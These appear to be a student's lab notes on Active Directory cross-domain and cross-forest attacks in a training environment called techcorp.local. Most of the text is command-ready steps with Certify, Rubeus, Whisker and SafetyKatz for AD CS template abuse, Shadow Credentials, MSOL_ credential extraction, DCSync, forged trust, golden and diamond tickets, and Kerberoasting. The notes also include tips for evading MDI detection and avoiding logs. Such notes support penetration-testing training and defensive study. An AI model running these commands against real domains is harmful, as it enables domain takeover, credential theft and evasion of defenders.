
### Cross Domain Attacks

• Active Directory Certificate Services (AD CS) enables use of Public Key
Infrastructure (PKI) in active directory forest.
• AD CS helps in authenticating users and machines, encrypting and
signing documents, filesystem, emails and more.
• "AD CS is the Server Role that allows you to build a public key
infrastructure (PKI) and provide public key cryptography, digital
certificates, and digital signature capabilities for your organization."

###### Terminology

• CA - The certification authority that issues certificates. The server with AD CS
role (DC or separate) is the CA.
• Certificate - Issued to a user or machine and can be used for authentication,
encryption, signing etc.
• CSR - Certificate Signing Request made by a client to the CA to request a
certificate.
• Certificate Template - Defines settings for a certificate. Contains information
like - enrolment permissions, EKUs, expiry etc.
• EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a
certificate template (Client authentication, Smart Card Logon, SubCA etc.)


###### Abuse

![[Pasted image 20250211215254.png]]


![[Pasted image 20250211215322.png]]

#### AD CS Enumeration

We can use the Certify tool (https://github.com/GhostPack/Certify) to
enumerate (and for other attacks) AD CS in the target forest:

```
Certify.exe cas
```

Enumerate the templates.:

```
Certify.exe find
```

Enumerate vulnerable templates:

```
Certify.exe find /vulnerable
```


#### Priv Esc - Across domain trusts – AD CS


  Common requirements/misconfigurations for all the Escalations
	– CA grants normal/low-privileged users enrollment rights
	– Manager approval is disabled
	– Authorization signatures are not required
	– The target template grants normal/low-privileged users enrollment
	   rights



Note that this does not show up when we enumerate vulnerable
templates in Certify. Use:

```
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
```

We have the certificate of pawadmin that we extracted from us-jump.

Use the certificate to request a TGT for pawadmin and inject it:

```
C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin
/certificate:C:\AD\Tools\pawadmin.pfx
/password:SecretPass@123 /nowrap /ptt
```

Request a certificate for DA!

```
C:\AD\Tools\Certify.exe request /ca:Techcorp-
DC.techcorp.local\TECHCORP-DC-CA
/template:ForAdminsofPrivilegedAccessWorkstations
/altname:Administrator
```

Convert from cert.pem to pfx:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -
keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export
-out C:\AD\Tools\DA.pfx
```

Request DA TGT and inject it:

```
C:\AD\Tools\Rubeus.exe asktgt /user:Administrator
/certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap
/ptt
```

Request a certificate for EA!

```
C:\AD\Tools\Certify.exe request /ca:Techcorp-
DC.techcorp.local\TECHCORP-DC-CA
/template:ForAdminsofPrivilegedAccessWorkstations
/altname:Administrator
```

Convert from cert.pem to pfx:

```
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -
keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export
-out C:\AD\Tools\EA.pfx
```

Request EA TGT and inject it:

```
C:\AD\Tools\Rubeus.exe asktgt /user:techcorp.local\Administrator
/dc:techcorp-dc.techcorp.local /certificate:C:\AD\Tools\EA.pfx
/password:SecretPass@123 /nowrap /ptt
```


#### Shadow Credentials

• Users and Computers have msDS-KeyCredentialLink attribute that
contains the raw public keys of certificate that can be used as an
alternate credential.

• This attribute is used when we configure Windows Hello for Business
(WHfB)

• By default, Key Admins and Enterprise Key Admins have rights to modify
the msDS-KeyCredentialLink attribute.

• User to User (U2U) Service Ticket can be requested to decrypt the
encrypted NTLM_SUPPLEMENTAL_CREDENTIAL entity from Privilege
Attribute Certificate (PAC) and extract NTLM hash.

• Pre-requisites to abuse Shadow Credentials:
- AD CS (Key Trust if AD CS is not present)
- Support for PKINIT and at least one DC with Windows Server 2016 or
above.

- Permissions (GenericWrite/GenericAll) to modify the msDS-
KeyCredentialLink attribute of the target object.


##### Abusing User Object

Enumerate the permissions.

```
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match "StudentUsers"}
```

Add the Shadow Credential.

```
Whisker.exe add /target:supportXuser
```

Using PowerView, see if the Shadow Credential is added.

```
Get-DomainUser -Identity supportXuser
```

Request the TGT by leveraging the certificate.

```
Rubeus.exe asktgt /user:supportXuser
/certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW....
/password:"1OT0qAom3..." /domain:us.techcorp.local
/dc:US-DC.us.techcorp.local /getcredentials /show
/nowrap
```

Inject the TGT in the current session or use the NTLM hash

```
Rubeus.exe ptt /ticket:doIGgDCCBnygAwIBBaEDAgEW...
```

#### Abusing Computer Object

Enumerate the permissions.

```
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match 'mgmtadmin’}
```

Add the Shadow Credentials.

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin
/domain:us.techcorp.local
/aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b4
19db24c00f /run:cmd.exe" "exit"
```

```
Whisker.exe add /target:us-helpdesk$
```


Using PowerView, see if the Shadow Credential is added.

```
Get-DomainComputer -Identity us-helpdesk
```

Request the TGT by leveraging the certificate.

```
Rubeus.exe asktgt /user:us-helpdesk$
/certificate:MIIJ0AIBAzCCCYwGCSqGSIb...
/password:"ViGFoZJa..." /domain:us.techcorp.local
/dc:US-DC.us.techcorp.local /getcredentials /show
```

Request and Inject the TGS by impersonating the user.

```
Rubeus.exe s4u /dc:us-dc.us.techcorp.local
/ticket:doIGkDCCBoygAwIBBaEDAgEW...
/impersonateuser:administrator /ptt /self
/altservice:cifs/us-helpdesk
```


#### Attacking Azure AD Integration

• Azure AD is a popular method to extend identity management from on-
premises AD to Microsoft's Azure offerings.

• Many enterprises use their on-prem AD identities to access Azure
applications.
• "A single user identity for authentication and authorization to all
resources, regardless of location...is hybrid identity."

• An on-premises AD can be integrated with Azure AD using Azure AD
Connect with the following methods:
– Password Hash Sync (PHS)
– Pass-Through Authentication (PTA)
– Federation
• Azure AD Connect is installed on-premises and has a high privilege
account both in on AD and Azure AD!


• Let's target PHS.
• It shares users and their password hashes from on-premises AD to Azure AD.
• A new users MSOL_ is created which has Synchronization rights (DCSync) on the domain!

#### Attacking Azure AD Integration - PHS

Enumerate the PHS account and server where AD Connect is installed.

Using PowerView:

```
Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local
```

Using the ActiveDirectory module:

```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -
Server techcorp.local -Properties * | select
SamAccountName,Description | fl
```

We already have administrative access to us-adconnect as helpdeskadmin.

With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text

```
.\adconnect.ps1
```

With the password, we can run commands as MSOL_

```
runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
```

And can then execute the DCSync attack:

```
SafetyKatz.exe '"lsadump::dcsync /user:us\krbtgt"'
```

```
SafetyKatz.exe '"lsadump::dcsync /user:techcorp\krbtgt
/domain:techcorp.local"'
```

Please note that because AD Connect synchronizes hashes every two minutes, in an Enterprise Environment, the MSOL_ account will be excluded from tools like MDI! This will allow us to run DCSync without any alerts!

#### Forest Root

• sIDHistory is a user attribute designed for scenarios where a user is
moved from one domain to another. When a user's domain is changed,
they get a new SID and the old SID is added to sIDHistory.
• sIDHistory can be abused in two ways of escalating privileges within a
forest:
– krbtgt hash of the child
– Trust tickets
• All the Privilege Escalation to techcorp.local we have seen till now needs
some misconfiguration. These ones are 'working as intended'.

#### Child to Forest Root - Trust Key

So, what is required to forge trust tickets is, obviously, the trust key.
Look for  trust key from child to parent.

```
SafetyKatz.exe '"lsadump::trust /patch"'
```

OR

```
SafetyKatz.exe '"lsadump::dcsync /user:us\techcorp$"'
```

OR

```
SafetyKatz.exe '"lsadump::lsa /patch"'
```

We can also use any of the earlier discussed tools to extract trust keys.

Using Rubeus, forge a ticket

```
C:\AD\Tools\Rubeus.exe silver /user:Administrator /ldap
/service:krbtgt/TECHCORP.LOCAL
/rc4:a6215eeb238da9262d014a529fe03adb /sids:S-1-5-21-
2781415573-3701854478-2406986946-519 /nowrap
```

Use the forged ticket

```
C:\AD\Tools\Rubeus.exe asktgs /service:CIFS/techcorp-
dc.TECHCORP.LOCAL /dc:techcorp-dc.TECHCORP.LOCAL /ptt
/ticket:
```

#### Child to Forest Root - krbtgt

We will abuse sIDhistory once again

```
Rubeus.exe /user:Administrator /id:500
/domain:us.techcorp.local /sid:S-1-5-21-210670787-
2521448726-163245708 /groups:513 /sids:S-1-5-21-
2781415573-3701854478-2406986946-519
/aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3
EF6FC1FFA58CACD5 /ptt
```

In the above command, the mimkatz option "/sids" is forcefully setting the
sIDHistory for the Enterprise Admin group for us.techcorp.local that is the
Forest Enterprise Admin Group.

We can now access techcorp-dc as Administrator:

```
ls \\techcorp-dc.techcorp.local\C$

Enter-PSSession techcorp-dc.techcorp.local
```

Avoid suspicious logs and bypass MDI by using Domain Controller
identity

```
Rubeus.exe golden /user:us-dc$ /id:1000 /domain:us.techcorp.local
/sid:S-1-5-21-210670787-2521448726-163245708 /groups:513 /sids:S-1-
5-21-2781415573-3701854478-2406986946-516,S-1-5-9
/aes256:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58C
ACD5 /dc:us-dc.us.techcorp.local /ptt
```

S-1-5-21-2578538781-2508153159-3419410681-516 – Domain Controllers
S-1-5-9 – Enterprise Domain Controllers

```
SafetyKatz.exe '"lsadump::dcsync /user:techcorp\krbtgt
/domain:techcorp.local"'
```

Diamond ticket with SID History will avoid suspicious logs on child DC
and parent DC. Also bypasses MDI:


```
Rubeus.exe diamond
/krbkey:5E3D2096ABB01469A3B0350962B0C65CEDBBC611C5EAC6F3EF6FC1FFA58C
ACD5 /tgtdeleg /enctype:aes /ticketuser:us-dc$
/domain:us.techcorp.local /dc:us-dc.us.techcorp.local
/ticketuserid:1000 /sids:S-1-5-21-2781415573-3701854478-2406986946-
516,S-1-5-9 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```
SafetyKatz.exe '"lsadump::dcsync /user:techcorp\krbtgt
/domain:techcorp.local"'
```



### Cross Forest Attacks

##### Kerberoast

• It is possible to execute Kerberoast across Forest trusts.
• Let's enumerate named service accounts across forest trusts


Using PowerView

```
Get-DomainTrust | ?{$_.TrustAttributes -eq
'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain
$_.TargetName}
```


Using ActiveDirectory Module:

```
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-
ADUser -Filter {ServicePrincipalName -ne "$null"} -
Properties ServicePrincipalName -Server $_.Name}
```

Request a TGS

```
C:\AD\Tools\Rubeus.exe kerberoast /user:storagesvc /simple
/domain:eu.local /outfile:euhashes.txt
```

Check for the TGS

```
klist
```

Crack using John

```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt
C:\AD\Tools\hashes.txt
```

Request TGS across trust using PowerShell

```
Add-Type -AssemblyName System.IdentityModel
$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/eu-file.eu.local@eu.local"
```

#### Constrained Delegation with Protocol Transition

• The classic Constrained Delegation does not work across forest trusts.

• But we can abuse it once we have a beachhead/foothold across forest trust.

Using PowerView

```
Get-DomainUser –TrustedToAuth -Domain eu.local
Get-DomainComputer –TrustedToAuth -Domain eu.local
```

Using ActiveDirectory module:

```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -
Properties msDS-AllowedToDelegateTo -Server eu.local
```

Abuse the TGS to LDAP:

```
SafetyKatz.exe '"lsadump::dcsync /user:eu\krbtgt /domain:eu.local"'
```

OR

```
SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --
DomainController eu-dc.eu.local

SharpKatz.exe --Command dcsync --User eu\administrator --Domain
eu.local --DomainController eu-dc.eu.local
```


